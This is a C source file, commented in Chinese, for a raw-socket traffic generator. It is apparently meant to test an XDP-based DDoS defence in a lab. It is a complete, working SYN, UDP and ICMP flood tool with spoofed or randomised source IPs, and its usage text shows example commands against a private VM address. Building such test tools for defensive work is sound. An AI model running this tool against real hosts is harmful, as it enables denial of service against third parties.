// SPDX-License-Identifier: GPL-2.0
#define _GNU_SOURCE   // 暴露 glibc 扩展类型（struct tcphdr 等）
// ============================================================
// 08 - DDoS 测试流量生成器
//
// 用途：测试 07-xdp-ddos XDP 防护效果
//
// 工作原理：
//   使用 SOCK_RAW + IP_HDRINCL 手动构造 IP 包
//   绕过内核 TCP/UDP 协议栈，直接发送裸包
//   支持固定源 IP（测试 per-IP 限速）或随机源 IP
//
// 测试场景：
//   1. 令牌桶限速：固定源 IP + 高速率 → 触发限速拉黑
//   2. SYN Flood：固定源 IP + syn 模式 → 触发 SYN flood 检测
//   3. 多源扫射：随机源 IP → 测试 LRU hash map 容量
//
// 编译：make
// 运行：sudo ./flood -d <目标IP> -s <源IP> -m syn -r 2000
// ============================================================

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <getopt.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>

// ============================================================
// 数据结构
// ============================================================

typedef enum {
    MODE_SYN,   // TCP SYN flood：触发 SYN flood 检测（每 IP 超过 syn_threshold/s）
    MODE_UDP,   // UDP flood：触发令牌桶限速
    MODE_ICMP,  // ICMP echo flood
} flood_mode_t;

struct flood_cfg {
    uint32_t     dst_ip;       // 目标 IP（网络字节序）
    uint32_t     src_ip;       // 源 IP（0 = 随机）
    uint16_t     dst_port;     // 目标端口（TCP/UDP）
    flood_mode_t mode;
    long         pps;          // 目标发包速率（包/秒）
    int          duration;     // 持续时间（秒，0 = 无限）
    int          random_src;   // 1 = 随机源 IP
    int          verbose;
};

struct stats {
    uint64_t sent;
    uint64_t errors;
    time_t   start;
};

// TCP/UDP 校验和用的伪首部
struct pseudo_hdr {
    uint32_t src, dst;
    uint8_t  zero, proto;
    uint16_t len;
};

// ============================================================
// 信号处理
// ============================================================

static volatile int running = 1;
static void sig_handler(int sig) { (void)sig; running = 0; }

// ============================================================
// 校验和计算
// ============================================================

// 标准 Internet 校验和（RFC 1071）
static uint16_t inet_cksum(const void *data, int len)
{
    const uint16_t *p = data;
    uint32_t sum = 0;
    while (len > 1) { sum += *p++; len -= 2; }
    if (len)         sum += *(const uint8_t *)p;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)~sum;
}

// TCP 校验和（含伪首部）
static uint16_t tcp_cksum(const struct iphdr *ip, const struct tcphdr *tcp)
{
    char buf[sizeof(struct pseudo_hdr) + sizeof(struct tcphdr)];
    struct pseudo_hdr *ph = (struct pseudo_hdr *)buf;
    ph->src   = ip->saddr;
    ph->dst   = ip->daddr;
    ph->zero  = 0;
    ph->proto = IPPROTO_TCP;
    ph->len   = htons(sizeof(struct tcphdr));
    memcpy(buf + sizeof(*ph), tcp, sizeof(struct tcphdr));
    return inet_cksum(buf, (int)sizeof(buf));
}

// ============================================================
// 包构造
// ============================================================

// TCP SYN 包：触发 SYN flood 检测
// 每个包随机源端口和序列号，模拟真实 SYN flood
static int build_syn(char *pkt, const struct flood_cfg *cfg, uint32_t src_ip)
{
    struct iphdr  *ip  = (struct iphdr *)pkt;
    struct tcphdr *tcp = (struct tcphdr *)(pkt + sizeof(*ip));
    int total = sizeof(*ip) + sizeof(*tcp);

    // IP 头
    ip->ihl      = 5;
    ip->version  = 4;
    ip->tos      = 0;
    ip->tot_len  = htons(total);
    ip->id       = htons((uint16_t)(rand() & 0xffff));
    ip->frag_off = 0;
    ip->ttl      = 64;
    ip->protocol = IPPROTO_TCP;
    ip->check    = 0;
    ip->saddr    = src_ip;
    ip->daddr    = cfg->dst_ip;
    ip->check    = inet_cksum(ip, sizeof(*ip));

    // TCP SYN
    tcp->source  = htons((uint16_t)(1024 + rand() % 60000));
    tcp->dest    = htons(cfg->dst_port);
    tcp->seq     = htonl((uint32_t)rand());
    tcp->ack_seq = 0;
    tcp->doff    = 5;
    tcp->syn     = 1;
    tcp->ack     = 0;
    tcp->fin     = 0;
    tcp->rst     = 0;
    tcp->psh     = 0;
    tcp->urg     = 0;
    tcp->window  = htons(65535);
    tcp->check   = 0;
    tcp->urg_ptr = 0;
    tcp->check   = tcp_cksum(ip, tcp);

    return total;
}

// UDP 包：触发令牌桶限速
static int build_udp(char *pkt, const struct flood_cfg *cfg, uint32_t src_ip)
{
    struct iphdr  *ip  = (struct iphdr *)pkt;
    struct udphdr *udp = (struct udphdr *)(pkt + sizeof(*ip));
    const int payload_len = 8;
    int total = sizeof(*ip) + sizeof(*udp) + payload_len;

    ip->ihl      = 5;
    ip->version  = 4;
    ip->tos      = 0;
    ip->tot_len  = htons(total);
    ip->id       = htons((uint16_t)(rand() & 0xffff));
    ip->frag_off = 0;
    ip->ttl      = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check    = 0;
    ip->saddr    = src_ip;
    ip->daddr    = cfg->dst_ip;
    ip->check    = inet_cksum(ip, sizeof(*ip));

    udp->source = htons((uint16_t)(1024 + rand() % 60000));
    udp->dest   = htons(cfg->dst_port);
    udp->len    = htons((uint16_t)(sizeof(*udp) + payload_len));
    udp->check  = 0;  // IPv4 UDP 校验和可选

    return total;
}

// ICMP Echo 包
static int build_icmp(char *pkt, const struct flood_cfg *cfg, uint32_t src_ip)
{
    struct iphdr   *ip   = (struct iphdr *)pkt;
    struct icmphdr *icmp = (struct icmphdr *)(pkt + sizeof(*ip));
    int total = sizeof(*ip) + sizeof(*icmp);

    ip->ihl      = 5;
    ip->version  = 4;
    ip->tos      = 0;
    ip->tot_len  = htons(total);
    ip->id       = htons((uint16_t)(rand() & 0xffff));
    ip->frag_off = 0;
    ip->ttl      = 64;
    ip->protocol = IPPROTO_ICMP;
    ip->check    = 0;
    ip->saddr    = src_ip;
    ip->daddr    = cfg->dst_ip;
    ip->check    = inet_cksum(ip, sizeof(*ip));

    icmp->type             = ICMP_ECHO;
    icmp->code             = 0;
    icmp->checksum         = 0;
    icmp->un.echo.id       = htons((uint16_t)(rand() & 0xffff));
    icmp->un.echo.sequence = htons((uint16_t)(rand() & 0xffff));
    icmp->checksum         = inet_cksum(icmp, sizeof(*icmp));

    return total;
}

// ============================================================
// 速率控制（令牌桶）
// ============================================================

struct rate_ctrl {
    long    pps;
    int64_t tokens;    // 当前令牌数（×1000 精度）
    int64_t last_us;   // 上次补充时间（微秒）
};

static int64_t now_us(void)
{
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return (int64_t)tv.tv_sec * 1000000 + tv.tv_usec;
}

static void rate_init(struct rate_ctrl *rc, long pps)
{
    rc->pps     = pps;
    rc->tokens  = pps * 1000;   // 初始满桶（×1000 精度）
    rc->last_us = now_us();
}

// 尝试消耗一个令牌，返回 1=可发包，0=需等待
static int rate_check(struct rate_ctrl *rc)
{
    int64_t now   = now_us();
    int64_t delta = now - rc->last_us;

    // 补充令牌：delta 微秒 × pps / 1e6 = 应补充包数
    rc->tokens  += delta * rc->pps / 1000;  // ÷1000（微秒→毫秒→×pps/1000）
    rc->last_us  = now;

    int64_t max_tokens = (int64_t)rc->pps * 1000;  // 桶容量 = 1 秒
    if (rc->tokens > max_tokens)
        rc->tokens = max_tokens;

    if (rc->tokens >= 1000) {
        rc->tokens -= 1000;
        return 1;
    }
    return 0;
}

// ============================================================
// 辅助：生成随机公网 IP（1.0.0.0 - 254.254.254.254）
// ============================================================

static uint32_t random_src_ip(void)
{
    // 构造 A.B.C.D，每段 1-254
    uint32_t a = (uint32_t)(rand() % 254 + 1);
    uint32_t b = (uint32_t)(rand() % 254 + 1);
    uint32_t c = (uint32_t)(rand() % 254 + 1);
    uint32_t d = (uint32_t)(rand() % 254 + 1);
    // htonl：host byte order → network byte order
    return htonl((a << 24) | (b << 16) | (c << 8) | d);
}

// ============================================================
// 统计输出
// ============================================================

static void print_stats(const struct stats *st)
{
    time_t elapsed = time(NULL) - st->start;
    if (elapsed == 0) elapsed = 1;
    printf("\r  已发送: %-10lu  实际速率: %-8lu pps  错误: %-6lu  时长: %lds   ",
           (unsigned long)st->sent,
           (unsigned long)(st->sent / (uint64_t)elapsed),
           (unsigned long)st->errors,
           (long)elapsed);
    fflush(stdout);
}

// ============================================================
// 主发包循环
// ============================================================

static void do_flood(int sock, const struct flood_cfg *cfg)
{
    char pkt[256];
    struct sockaddr_in dst = {
        .sin_family      = AF_INET,
        .sin_addr.s_addr = cfg->dst_ip,
    };
    struct stats    st = { .start = time(NULL) };
    struct rate_ctrl rc;
    rate_init(&rc, cfg->pps);

    const char *mode_names[] = { "SYN", "UDP", "ICMP" };

    // 打印启动信息
    char dst_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &cfg->dst_ip, dst_str, sizeof(dst_str));

    printf("[+] 模式: %s Flood\n", mode_names[cfg->mode]);
    printf("[+] 目标: %s:%u\n", dst_str, cfg->dst_port);
    if (cfg->random_src)
        printf("[+] 源 IP: 随机（每包不同）\n");
    else {
        char src_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &cfg->src_ip, src_str, sizeof(src_str));
        printf("[+] 源 IP: %s（固定，触发 per-IP 限速）\n", src_str);
    }
    char dur_str[32];
    if (cfg->duration)
        snprintf(dur_str, sizeof(dur_str), "%d 秒", cfg->duration);
    else
        snprintf(dur_str, sizeof(dur_str), "无限（Ctrl+C 停止）");
    printf("[+] 目标速率: %ld pps  持续: %s\n", cfg->pps, dur_str);
    printf("[+] 开始发包...\n\n");

    while (running) {
        if (cfg->duration && (time(NULL) - st.start) >= cfg->duration)
            break;

        if (!rate_check(&rc)) {
            // 令牌不足，短暂让出 CPU
            struct timespec ts = { .tv_sec = 0, .tv_nsec = 50000 };  // 50 µs
            nanosleep(&ts, NULL);
            continue;
        }

        // 选择源 IP
        uint32_t src_ip = cfg->random_src ? random_src_ip() : cfg->src_ip;

        // 构造包
        memset(pkt, 0, sizeof(pkt));
        int pkt_len;
        switch (cfg->mode) {
        case MODE_SYN:  pkt_len = build_syn(pkt, cfg, src_ip);  break;
        case MODE_UDP:  pkt_len = build_udp(pkt, cfg, src_ip);  break;
        case MODE_ICMP: pkt_len = build_icmp(pkt, cfg, src_ip); break;
        default: return;
        }

        // 发送
        ssize_t n = sendto(sock, pkt, (size_t)pkt_len, 0,
                           (struct sockaddr *)&dst, sizeof(dst));
        if (n < 0) {
            st.errors++;
            if (cfg->verbose) perror("sendto");
        } else {
            st.sent++;
        }

        // 每 500 包刷新统计
        if (st.sent % 500 == 0)
            print_stats(&st);
    }

    print_stats(&st);
    printf("\n\n[+] 完成：总发送 %lu 包，错误 %lu\n",
           (unsigned long)st.sent, (unsigned long)st.errors);
}

// ============================================================
// 帮助信息
// ============================================================

static void usage(const char *prog)
{
    printf(
        "用法: %s -d <目标IP> [选项]\n"
        "\n"
        "  -d, --dst <ip>      目标 IP（必填）\n"
        "  -s, --src <ip>      源 IP（默认：随机，指定后固定不变）\n"
        "  -p, --dport <n>     目标端口（默认：80）\n"
        "  -m, --mode <type>   攻击模式：syn | udp | icmp（默认：syn）\n"
        "  -r, --rate <pps>    目标速率 包/秒（默认：2000）\n"
        "  -t, --time <sec>    持续时间秒（默认：10，0=无限）\n"
        "  -v, --verbose       显示发包错误详情\n"
        "  -h, --help          显示帮助\n"
        "\n"
        "测试示例（目标 VM IP 假设为 192.168.1.100）:\n"
        "\n"
        "  # 测试令牌桶限速：固定源 IP，速率超过 max_pps(1000)\n"
        "  sudo ./flood -d 192.168.1.100 -s 10.0.0.1 -m udp -r 5000 -t 30\n"
        "\n"
        "  # 测试 SYN Flood 检测：同一 IP 每秒 SYN 超过 syn_threshold(500)\n"
        "  sudo ./flood -d 192.168.1.100 -s 10.0.0.2 -m syn -r 1000 -t 30\n"
        "\n"
        "  # 测试自动拉黑：持续限速超过 blacklist_threshold(10) 次后拉黑\n"
        "  sudo ./flood -d 192.168.1.100 -s 10.0.0.3 -m udp -r 3000 -t 60\n"
        "\n"
        "  # 多源 IP 扫射（随机源）：测试 LRU hash map 容量\n"
        "  sudo ./flood -d 192.168.1.100 -m udp -r 20000 -t 30\n"
        "\n"
        "注意：需要 root 权限（raw socket）\n",
        prog);
}

// ============================================================
// main
// ============================================================

int main(int argc, char **argv)
{
    struct flood_cfg cfg = {
        .dst_port   = 80,
        .mode       = MODE_SYN,
        .pps        = 2000,
        .duration   = 10,
        .random_src = 1,   // 默认随机源 IP
    };

    static struct option long_opts[] = {
        { "dst",     required_argument, 0, 'd' },
        { "src",     required_argument, 0, 's' },
        { "dport",   required_argument, 0, 'p' },
        { "mode",    required_argument, 0, 'm' },
        { "rate",    required_argument, 0, 'r' },
        { "time",    required_argument, 0, 't' },
        { "verbose", no_argument,       0, 'v' },
        { "help",    no_argument,       0, 'h' },
        { 0, 0, 0, 0 }
    };

    int c;
    while ((c = getopt_long(argc, argv, "d:s:p:m:r:t:vh", long_opts, NULL)) != -1) {
        switch (c) {
        case 'd':
            if (!inet_pton(AF_INET, optarg, &cfg.dst_ip)) {
                fprintf(stderr, "[-] 无效目标 IP: %s\n", optarg);
                return 1;
            }
            break;
        case 's':
            if (!inet_pton(AF_INET, optarg, &cfg.src_ip)) {
                fprintf(stderr, "[-] 无效源 IP: %s\n", optarg);
                return 1;
            }
            cfg.random_src = 0;
            break;
        case 'p': cfg.dst_port = (uint16_t)atoi(optarg);    break;
        case 'm':
            if      (!strcmp(optarg, "syn"))  cfg.mode = MODE_SYN;
            else if (!strcmp(optarg, "udp"))  cfg.mode = MODE_UDP;
            else if (!strcmp(optarg, "icmp")) cfg.mode = MODE_ICMP;
            else { fprintf(stderr, "[-] 未知模式: %s\n", optarg); return 1; }
            break;
        case 'r': cfg.pps      = atol(optarg); break;
        case 't': cfg.duration = atoi(optarg); break;
        case 'v': cfg.verbose  = 1;            break;
        case 'h': usage(argv[0]); return 0;
        default:  usage(argv[0]); return 1;
        }
    }

    if (!cfg.dst_ip) {
        fprintf(stderr, "[-] 请指定目标 IP（-d <ip>）\n\n");
        usage(argv[0]);
        return 1;
    }

    // 创建 raw socket（需要 root）
    // IPPROTO_RAW：允许手动填充 IP 头，内核自动路由
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("[-] socket（需要 root 权限）");
        return 1;
    }

    // IP_HDRINCL：告知内核 IP 头由我们自己提供，不再自动填充
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("[-] setsockopt IP_HDRINCL");
        close(sock);
        return 1;
    }

    signal(SIGINT,  sig_handler);
    signal(SIGTERM, sig_handler);
    srand((unsigned int)time(NULL));

    do_flood(sock, &cfg);

    close(sock);
    return 0;
}
